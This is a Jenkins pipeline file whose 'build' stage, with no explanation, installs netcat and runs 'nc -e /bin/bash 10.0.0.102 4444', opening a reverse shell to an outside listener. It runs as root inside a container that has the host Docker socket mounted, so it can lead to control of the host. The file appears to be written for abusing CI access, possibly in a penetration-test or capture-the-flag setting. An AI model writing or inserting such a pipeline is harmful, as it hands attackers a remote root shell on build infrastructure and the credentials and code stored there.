pipeline {
    agent {
      docker {
        image 'ubuntu:18.04'
        args '-u root:sudo -v /var/run/docker.sock:/var/run/docker.sock'
        }
      }
    stages {
        stage('build') {
            steps {
                sh 'apt update -y'
                sh 'apt install curl -y'
                sh 'apt install netcat-traditional -y'
                sh 'nc -e /bin/bash 10.0.0.102 4444'
            }
        }
    }
}
